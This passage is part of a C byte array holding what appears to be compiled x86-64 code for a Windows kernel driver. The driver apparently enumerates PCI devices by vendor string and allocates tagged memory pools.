    0xBA, 0x19, 0x00, 0x02, 0x00, 0x48, 0x89, 0x44, 0x24, 0x70, 0xC7, 0x44, 0x24, 0x60, 0x30, 0x00,
    0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x68, 0xC7, 0x44, 0x24, 0x78, 0x40, 0x00, 0x00, 0x00, 0x4C,
    0x89, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xB4, 0x24, 0x88, 0x00, 0x00, 0x00, 0xFF,
    0x15, 0x33, 0x32, 0x00, 0x00, 0x85, 0xC0, 0x44, 0x8B, 0xE8, 0x0F, 0x88, 0xC7, 0x01, 0x00, 0x00,
    0x4C, 0x89, 0xBC, 0x24, 0xF0, 0x01, 0x00, 0x00, 0x41, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89,
    0xB4, 0x24, 0x38, 0x02, 0x00, 0x00, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x44,
    0x24, 0x28, 0x45, 0x8B, 0xC7, 0x41, 0x8B, 0xD4, 0x44, 0x89, 0x74, 0x24, 0x20, 0x40, 0x32, 0xFF,
    0xFF, 0x15, 0xDA, 0x31, 0x00, 0x00, 0x8B, 0x54, 0x24, 0x40, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20,
    0x41, 0x8B, 0xCF, 0x48, 0x83, 0xC2, 0x08, 0xFF, 0x15, 0x03, 0x31, 0x00, 0x00, 0x8B, 0x4C, 0x24,
    0x40, 0x45, 0x8B, 0xC7, 0x48, 0x8B, 0xF0, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x41, 0x8B, 0xD4, 0x48,
    0x89, 0x44, 0x24, 0x28, 0x89, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x4C, 0x8B, 0xCE,
    0xFF, 0x15, 0x9A, 0x31, 0x00, 0x00, 0x85, 0xC0, 0x44, 0x8B, 0xE8, 0x79, 0x09, 0x41, 0x0F, 0xB6,
    0xEF, 0xE9, 0x08, 0x01, 0x00, 0x00, 0x40, 0x84, 0xED, 0x0F, 0x85, 0xFF, 0x00, 0x00, 0x00, 0x83,
    0x7E, 0x04, 0x08, 0x0F, 0x85, 0xF5, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x56, 0x14, 0x48, 0x8D, 0x8C,
    0x24, 0x90, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x15, 0x31, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x90,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x45, 0x0F, 0xB6, 0xC7, 0xFF, 0x15, 0x46, 0x31,
    0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x8D, 0x15, 0x92, 0x21, 0x00, 0x00, 0xFF, 0x15,
    0x2C, 0x31, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xA3, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C,
    0x24, 0x58, 0x48, 0x8D, 0x15, 0x67, 0x21, 0x00, 0x00, 0xFF, 0x15, 0x11, 0x31, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x0F, 0x84, 0x88, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x46, 0x08, 0x4C, 0x03, 0xC6, 0x41,
    0x83, 0x78, 0x04, 0x05, 0x75, 0x7A, 0x45, 0x8B, 0x50, 0x10, 0x45, 0x85, 0xD2, 0x74, 0x71, 0x44,
    0x8B, 0x8C, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x49, 0x8D, 0x48, 0x14, 0x49, 0x8B, 0xD2, 0x66, 0x90,
    0x80, 0x39, 0x03, 0x75, 0x14, 0x44, 0x39, 0x49, 0x04, 0x75, 0x0E, 0x40, 0x0F, 0xB6, 0xC7, 0x40,
    0x84, 0xFF, 0x41, 0x0F, 0x44, 0xC7, 0x0F, 0xB6, 0xF8, 0x48, 0x83, 0xC1, 0x14, 0x48, 0xFF, 0xCA,
    0x75, 0xDE, 0x41, 0x3A, 0xFF, 0x75, 0x39, 0x45, 0x85, 0xD2, 0x41, 0x8B, 0xD6, 0x74, 0x2E, 0x49,
    0x8D, 0x48, 0x18, 0x80, 0x79, 0xFC, 0x02, 0x75, 0x18, 0x8B, 0x41, 0x04, 0x89, 0x43, 0x0C, 0x0F,
    0xB6, 0x01, 0x88, 0x43, 0x08, 0x48, 0x8B, 0x41, 0x08, 0x44, 0x89, 0x73, 0x18, 0x48, 0x89, 0x43,
    0x10, 0xFF, 0xC2, 0x48, 0x83, 0xC1, 0x14, 0x41, 0x3B, 0x50, 0x10, 0x72, 0xD6, 0x41, 0x8A, 0xEF,
    0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x6D, 0x30, 0x00, 0x00, 0x41, 0xFF, 0xC4, 0x48, 0x85,
    0xF6, 0x74, 0x0B, 0x33, 0xD2, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0xBA, 0x2F, 0x00, 0x00, 0x40, 0x84,
    0xED, 0x0F, 0x84, 0x69, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0xBC, 0x24, 0xF0, 0x01, 0x00, 0x00, 0x48,
    0x8B, 0xB4, 0x24, 0x38, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x4C, 0x8B, 0xB4, 0x24,
    0xF8, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xA4, 0x24, 0x08, 0x02, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x48,
    0x8B, 0xBC, 0x24, 0x10, 0x02, 0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0x30, 0x02, 0x00, 0x00, 0x48,
    0x8B, 0x9C, 0x24, 0x28, 0x02, 0x00, 0x00, 0x74, 0x06, 0xFF, 0x15, 0x01, 0x30, 0x00, 0x00, 0x41,
    0x8B, 0xC5, 0x4C, 0x8B, 0xAC, 0x24, 0x00, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xE0, 0x01,
    0x00, 0x00, 0xE8, 0x29, 0x16, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x18, 0x02, 0x00, 0x00, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xDC, 0x48, 0x81, 0xEC, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xE7, 0x3F, 0x00,
    0x00, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x49, 0x89, 0x5B, 0x18, 0x48,
    0x8B, 0x59, 0x38, 0x49, 0x89, 0x7B, 0x20, 0x48, 0x8B, 0xF9, 0x49, 0x8D, 0x4B, 0xB8, 0x45, 0x33,
    0xC0, 0x33, 0xD2, 0x89, 0x44, 0x24, 0x68, 0x89, 0x44, 0x24, 0x6C, 0x89, 0x44, 0x24, 0x70, 0x89,
    0x44, 0x24, 0x74, 0x89, 0x44, 0x24, 0x78, 0x89, 0x44, 0x24, 0x7C, 0xFF, 0x15, 0x67, 0x2F, 0x00,
    0x00, 0x45, 0x33, 0xC9, 0x4C, 0x8D, 0x5C, 0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x4C, 0x89,
    0x5C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x41, 0x8D, 0x49, 0x1B, 0x45, 0x33, 0xC0, 0x48,
    0x8B, 0xD3, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x2F, 0x2F, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x74, 0x6A, 0x48, 0x8B, 0x90, 0xB8, 0x00, 0x00, 0x00, 0xC7, 0x40, 0x30,
    0xBB, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0xCB, 0xC6, 0x42, 0xB8, 0x1B, 0xC6, 0x42, 0xB9, 0x15, 0x48,
    0x8B, 0xD0, 0xFF, 0x15, 0x00, 0x2F, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x75, 0x22, 0x48,
    0x8D, 0x4C, 0x24, 0x50, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0xC7, 0x44, 0x24,
    0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xD5, 0x2E, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x40, 0xEB,
    0x07, 0x85, 0xC0, 0x0F, 0x44, 0x44, 0x24, 0x40, 0x85, 0xC0, 0x78, 0x14, 0x48, 0x8B, 0x4C, 0x24,
    0x48, 0x33, 0xD2, 0x8B, 0x41, 0x14, 0x89, 0x44, 0x24, 0x7C, 0xFF, 0x15, 0x38, 0x2E, 0x00, 0x00,
    0xBA, 0x40, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0x8D, 0x4A, 0xC1, 0xFF, 0x15,
    0x1C, 0x2E, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x64, 0x33, 0xC0, 0x48, 0x8B,
    0xD3, 0x48, 0x89, 0x03, 0x48, 0x89, 0x43, 0x08, 0x48, 0x89, 0x43, 0x10, 0x48, 0x89, 0x43, 0x18,
    0x48, 0x89, 0x43, 0x20, 0x48, 0x89, 0x43, 0x28, 0x48, 0x89, 0x43, 0x30, 0x48, 0x89, 0x43, 0x38,
    0x48, 0x8B, 0x4F, 0x38, 0xE8, 0x27, 0xF9, 0xFF, 0xFF, 0x44, 0x0F, 0xB6, 0x5C, 0x24, 0x7C, 0x33,
    0xD2, 0x44, 0x88, 0x1F, 0x8B, 0x43, 0x08, 0xC1, 0xE8, 0x08, 0x33, 0x07, 0x25, 0x00, 0x1F, 0x00,
    0x00, 0x31, 0x07, 0x8B, 0x4B, 0x08, 0x8B, 0x07, 0xC1, 0xE1, 0x0D, 0x33, 0xC8, 0x81, 0xE1, 0x00,
    0xE0, 0x00, 0x00, 0x33, 0xC8, 0x89, 0x0F, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xB8, 0x2D, 0x00, 0x00,
    0x48, 0x8B, 0xBC, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0xB0, 0x00, 0x00, 0x00,
    0x33, 0xC0, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0xE8, 0x71, 0x14, 0x00, 0x00, 0x48,
    0x81, 0xC4, 0x98, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xDC, 0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x47, 0x3E, 0x00,
    0x00, 0x48, 0x89, 0x44, 0x24, 0x58, 0x4D, 0x89, 0x6B, 0xE8, 0x4D, 0x89, 0x73, 0xE0, 0x45, 0x33,
    0xF6, 0x4C, 0x8B, 0xE9, 0x4D, 0x8D, 0x4B, 0xA0, 0x45, 0x8D, 0x46, 0x01, 0x49, 0x8D, 0x4B, 0xC0,
    0x33, 0xD2, 0xC7, 0x44, 0x24, 0x48, 0x44, 0x89, 0x49, 0xAD, 0x66, 0xC7, 0x44, 0x24, 0x4C, 0x2F,
    0x76, 0x66, 0xC7, 0x44, 0x24, 0x4E, 0xD0, 0x11, 0xC6, 0x44, 0x24, 0x50, 0x8D, 0xC6, 0x44, 0x24,
    0x51, 0xCB, 0xC6, 0x44, 0x24, 0x52, 0x00, 0xC6, 0x44, 0x24, 0x53, 0xC0, 0xC6, 0x44, 0x24, 0x54,
    0x4F, 0xC6, 0x44, 0x24, 0x55, 0xC3, 0xC6, 0x44, 0x24, 0x56, 0x35, 0xC6, 0x44, 0x24, 0x57, 0x8C,
    0x4D, 0x89, 0x73, 0x98, 0x4D, 0x89, 0x73, 0xA8, 0x4D, 0x89, 0x73, 0xA0, 0xFF, 0x15, 0xDE, 0x2D,
    0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xDD, 0x01, 0x00, 0x00, 0x48, 0x89, 0x9C, 0x24, 0x98, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x28, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x48, 0x8B, 0xD3, 0xFF,
    0x15, 0x4B, 0x2D, 0x00, 0x00, 0x44, 0x0F, 0xB7, 0x5C, 0x24, 0x38, 0x66, 0x45, 0x85, 0xDB, 0x0F,
    0x84, 0x9D, 0x01, 0x00, 0x00, 0x48, 0x89, 0xAC, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB4,
    0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xBC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x64,
    0x24, 0x78, 0x66, 0x41, 0x83, 0xFB, 0x04, 0x0F, 0x86, 0x2E, 0x01, 0x00, 0x00, 0x41, 0x0F, 0xB7,
    0xD3, 0x66, 0x33, 0xC9, 0x83, 0xEA, 0x04, 0x85, 0xD2, 0x0F, 0x8E, 0x1C, 0x01, 0x00, 0x00, 0x90,
    0x66, 0x83, 0xF9, 0x14, 0x0F, 0x83, 0x11, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0xC1, 0x66, 0x83, 0x3C,
    0x43, 0x56, 0x75, 0x18, 0x66, 0x83, 0x7C, 0x43, 0x02, 0x45, 0x75, 0x10, 0x66, 0x83, 0x7C, 0x43,
    0x04, 0x4E, 0x75, 0x08, 0x66, 0x83, 0x7C, 0x43, 0x06, 0x5F, 0x74, 0x0F, 0x66, 0xFF, 0xC1, 0x0F,
    0xB7, 0xC1, 0x3B, 0xC2, 0x7C, 0xCA, 0xE9, 0xE0, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x4C, 0x24, 0x30,
    0x4C, 0x8D, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0xBA, 0xFF, 0x01, 0x1F, 0x00, 0xFF,
    0x15, 0x13, 0x2D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xB4, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x6C,
    0x24, 0x20, 0x49, 0x8B, 0x7D, 0x00, 0x48, 0x85, 0xFF, 0x4C, 0x8B, 0x65, 0x08, 0x75, 0x25, 0xBA,
    0x50, 0x02, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0xFF, 0x15, 0x0E, 0x2C,
    0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF0, 0x0F, 0x84, 0x83, 0x00, 0x00, 0x00, 0x49, 0x89,
    0x45, 0x00, 0xEB, 0x42, 0xBA, 0x50, 0x02, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x44, 0x64, 0x6B,
    0x20, 0xFF, 0x15, 0xE9, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0xF0, 0x48, 0x8D, 0x87, 0x48, 0x02, 0x00,
    0x00, 0x4C, 0x39, 0x30, 0x74, 0x19, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x38, 0x48, 0x8D, 0x87, 0x48, 0x02, 0x00, 0x00, 0x4C, 0x39, 0x30, 0x75, 0xF1, 0x48,
    0x89, 0xB7, 0x48, 0x02, 0x00, 0x00, 0x48, 0x85, 0xF6, 0x74, 0x36, 0x48, 0x8B, 0xCE, 0x4C, 0x89,
    0x66, 0x38, 0x48, 0x89, 0x6E, 0x30, 0x4C, 0x89, 0xB6, 0x48, 0x02, 0x00, 0x00, 0xE8, 0x7E, 0xFC,
    0xFF, 0xFF, 0x41, 0xFF, 0x45, 0x08, 0x48, 0x8B, 0xCE, 0xE8, 0xD2, 0xF8, 0xFF, 0xFF, 0x48, 0x8D,
    0x4E, 0x40, 0x41, 0xB8, 0x03, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xD3, 0xFF, 0x15, 0x4F, 0x2C, 0x00,
    0x00, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x4C, 0x89, 0x74, 0x24, 0x30, 0x0F, 0xB7, 0x44, 0x24, 0x3A,
    0x48, 0x8D, 0x4C, 0x24, 0x38, 0x48, 0xD1, 0xE8, 0x48, 0x8D, 0x1C, 0x43, 0x48, 0x8B, 0xD3, 0xFF,
    0x15, 0xCB, 0x2B, 0x00, 0x00, 0x66, 0x44, 0x8B, 0x5C, 0x24, 0x38, 0x66, 0x45, 0x85, 0xDB, 0x0F,
    0x85, 0x9D, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0x64, 0x24, 0x78, 0x48, 0x8B, 0xBC, 0x24, 0x80, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0xB4, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0xA0, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x33, 0xD2, 0xFF, 0x15, 0x29, 0x2B, 0x00, 0x00, 0x48,
    0x8B, 0x9C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x74, 0x24, 0x68, 0x4C, 0x8B, 0x6C, 0x24,
    0x70, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xE8, 0xE5, 0x11, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x88, 0x00,
    0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
    0x89, 0x70, 0x18, 0x48, 0x8B, 0xE9, 0x33, 0xF6, 0x48, 0x8D, 0x48, 0xE8, 0x48, 0x89, 0x78, 0x20,
    0x48, 0x89, 0x70, 0xE8, 0x89, 0x70, 0xF0, 0xE8, 0x44, 0xFD, 0xFF, 0xFF, 0x48, 0x85, 0xED, 0x48,
    0x8B, 0x7C, 0x24, 0x20, 0x48, 0x8B, 0xDF, 0x74, 0x71, 0x8B, 0x45, 0x00, 0x48, 0x8D, 0x0D, 0x4D,
    0x1C, 0x00, 0x00, 0x44, 0x8B, 0xC8, 0x44, 0x8B, 0xC0, 0x0F, 0xB6, 0xD0, 0x41, 0xC1, 0xE9, 0x0D,
    0x41, 0xC1, 0xE8, 0x08, 0x41, 0x83, 0xE1, 0x07, 0x41, 0x83, 0xE0, 0x1F, 0xE8, 0x8F, 0xE9, 0xFF,
    0xFF, 0x44, 0x8B, 0x44, 0x24, 0x28, 0x44, 0x8B, 0xDE, 0x45, 0x85, 0xC0, 0x74, 0x3C, 0x66, 0x90,
    0x48, 0x85, 0xDB, 0x74, 0x35, 0x8B, 0x0B, 0x8B, 0x55, 0x00, 0x8B, 0xC1, 0x33, 0xC2, 0x84, 0xC0,
    0x75, 0x19, 0x8B, 0xC1, 0x33, 0xC2, 0xA9, 0x00, 0x1F, 0x00, 0x00, 0x75, 0x0E, 0x33, 0xCA, 0xF7,
    0xC1, 0x00, 0xE0, 0x00, 0x00, 0x75, 0x04, 0x48, 0x8B, 0x73, 0x38, 0x48, 0x8B, 0x9B, 0x48, 0x02,
    0x00, 0x00, 0x41, 0xFF, 0xC3, 0x45, 0x3B, 0xD8, 0x72, 0xC6, 0x48, 0x85, 0xFF, 0x48, 0x8B, 0x6C,
    0x24, 0x48, 0x74, 0x24, 0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0xAA, 0x2A, 0x00, 0x00, 0x48, 0x8B,
    0x9F, 0x48, 0x02, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x28, 0x2A, 0x00, 0x00,
    0x48, 0x85, 0xDB, 0x48, 0x8B, 0xFB, 0x75, 0xDC, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C,
    0x24, 0x40, 0x48, 0x8B, 0xC6, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
    0x89, 0x70, 0x18, 0x48, 0x8B, 0xD9, 0x48, 0x8D, 0x48, 0xE8, 0x48, 0x89, 0x78, 0x20, 0x48, 0x8B,
    0xEA, 0x48, 0xC7, 0x40, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x40, 0xF0, 0x00, 0x00, 0x00, 0x00,
    0xBE, 0x02, 0x40, 0x6A, 0xC8, 0xE8, 0x36, 0xFC, 0xFF, 0xFF, 0x48, 0x85, 0xDB, 0x48, 0x8B, 0x7C,
    0x24, 0x20, 0x48, 0x8B, 0xD7, 0x74, 0x6D, 0x44, 0x8B, 0x54, 0x24, 0x28, 0x45, 0x33, 0xC0, 0x45,
    0x85, 0xD2, 0x74, 0x60, 0x48, 0x85, 0xD2, 0x74, 0x5B, 0x8B, 0x0A, 0x44, 0x8B, 0x0B, 0x8B, 0xC1,
    0x41, 0x33, 0xC1, 0x84, 0xC0, 0x75, 0x17, 0x8B, 0xC1, 0x41, 0x33, 0xC1, 0xA9, 0x00, 0x1F, 0x00,
    0x00, 0x75, 0x0B, 0x41, 0x33, 0xC9, 0xF7, 0xC1, 0x00, 0xE0, 0x00, 0x00, 0x74, 0x11, 0x48, 0x8B,
    0x92, 0x48, 0x02, 0x00, 0x00, 0x41, 0xFF, 0xC0, 0x45, 0x3B, 0xC2, 0x72, 0xC7, 0xEB, 0x25, 0x48,
    0x8B, 0xCD, 0x41, 0xB8, 0x50, 0x02, 0x00, 0x00, 0xE8, 0xD3, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0x4D,
    0x30, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xBA, 0xFF, 0x01, 0x1F, 0x00, 0xFF, 0x15, 0x26, 0x2A,
    0x00, 0x00, 0x33, 0xF6, 0x48, 0x85, 0xFF, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x74, 0x26, 0x66, 0x90,
    0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0x9E, 0x29, 0x00, 0x00, 0x48, 0x8B, 0x9F, 0x48, 0x02, 0x00,
    0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x1C, 0x29, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x48,
    0x8B, 0xFB, 0x75, 0xDC, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x8B, 0xC6,
    0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x33, 0xC0, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x7C, 0x24, 0x58,
    0x48, 0x89, 0x44, 0x24, 0x20, 0x89, 0x44, 0x24, 0x28, 0xE8, 0x52, 0xFB, 0xFF, 0xFF, 0x0F, 0xB7,
    0x54, 0x24, 0x28, 0x44, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8D, 0x0D, 0x81, 0x1A, 0x00, 0x00, 0xE8,
    0xBC, 0xE7, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x85, 0xFF, 0x74, 0x2E, 0x48, 0x89,
    0x5C, 0x24, 0x50, 0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0x1B, 0x29, 0x00, 0x00, 0x48, 0x8B, 0x9F,
    0x48, 0x02, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x99, 0x28, 0x00, 0x00, 0x48,
    0x85, 0xDB, 0x48, 0x8B, 0xFB, 0x75, 0xDC, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x66, 0x8B, 0x44, 0x24,
    0x28, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x33, 0xC0, 0x48, 0x89, 0x6C, 0x24, 0x48,
    0x48, 0x8B, 0xD9, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x74, 0x24, 0x50, 0x48, 0x89, 0x7C,
    0x24, 0x58, 0x48, 0x8B, 0xEA, 0x48, 0x89, 0x44, 0x24, 0x20, 0x89, 0x44, 0x24, 0x28, 0xE8, 0xAD,
    0xFA, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x66, 0x33, 0xF6, 0x4C, 0x8B, 0xC7, 0x66, 0x39,
    0x75, 0x00, 0x76, 0x47, 0x4D, 0x85, 0xC0, 0x74, 0x42, 0x41, 0x0F, 0xB6, 0x00, 0x0F, 0xB7, 0xD6,
    0x66, 0xFF, 0xC6, 0x48, 0x69, 0xD2, 0x08, 0x01, 0x00, 0x00, 0x88, 0x04, 0x1A, 0x8B, 0x04, 0x1A,
    0x41, 0x33, 0x00, 0x25, 0x00, 0x1F, 0x00, 0x00, 0x31, 0x04, 0x1A, 0x8B, 0x04, 0x1A, 0x8B, 0xC8,
    0x41, 0x33, 0x08, 0x81, 0xE1, 0x00, 0xE0, 0x00, 0x00, 0x33, 0xC8, 0x89, 0x0C, 0x1A, 0x66, 0x3B,
    0x75, 0x00, 0x4D, 0x8B, 0x80, 0x48, 0x02, 0x00, 0x00, 0x72, 0xB9, 0x48, 0x85, 0xFF, 0x74, 0x24,
    0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0x3E, 0x28, 0x00, 0x00, 0x48, 0x8B, 0x9F, 0x48, 0x02, 0x00,
    0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xBC, 0x27, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x48,
    0x8B, 0xFB, 0x75, 0xDC, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x66, 0x89,
    0x75, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x33, 0xC0, 0x48, 0x83,
    0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x58, 0x48, 0x89, 0x5C, 0x24, 0x78, 0x48, 0x89, 0x6C, 0x24, 0x50, 0x48, 0x89,
    0x74, 0x24, 0x48, 0x48, 0x8B, 0xEA, 0x48, 0x8B, 0xF1, 0x48, 0x89, 0x7C, 0x24, 0x40, 0x4C, 0x89,
    0x64, 0x24, 0x38, 0x45, 0x8B, 0xE0, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0xBA, 0x00, 0x01, 0x00,
    0x00, 0x33, 0xC9, 0xBB, 0x02, 0x80, 0x6A, 0xC8, 0xFF, 0x15, 0x42, 0x27, 0x00, 0x00, 0x48, 0x85,
    0xED, 0x48, 0x8B, 0xF8, 0x74, 0x3F, 0x48, 0x85, 0xC0, 0x74, 0x54, 0x48, 0x8B, 0xCE, 0xE8, 0x3D,
    0xFC, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x2D, 0x45, 0x33, 0xC9, 0x41, 0xB0, 0x0F, 0x48, 0x8B,
    0xD7, 0x48, 0x8B, 0xC8, 0xC7, 0x44, 0x24, 0x20, 0x40, 0x00, 0x00, 0x00, 0xE8, 0x3F, 0xF3, 0xFF,
    0xFF, 0x4D, 0x8B, 0xC4, 0x48, 0x8B, 0xD7, 0x49, 0xC1, 0xE0, 0x02, 0x48, 0x8B, 0xCD, 0xE8, 0x7D,
    0x09, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x85, 0xFF, 0x74, 0x15, 0x48, 0x8D, 0x15, 0xDF, 0x18, 0x00,
